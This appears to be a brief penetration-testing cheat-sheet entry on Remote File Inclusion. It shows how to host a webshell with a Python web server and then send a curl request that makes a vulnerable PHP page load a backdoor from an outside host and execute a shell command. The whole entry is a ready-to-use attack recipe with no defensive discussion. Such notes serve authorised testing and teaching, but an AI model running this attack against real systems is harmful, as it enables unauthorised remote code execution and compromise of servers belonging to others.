# Remote File Inclusion

__REQUIRES__

 - Misconfiguration

Place a webshell into a directory, host a webserver.
```bash
python3 -m http.server 80
```

Pull the shell and run a command
```bash
curl "http://example.local/meteor/index.php?page=http://192.168.0.25/simple-backdoor.php&cmd=ls"
```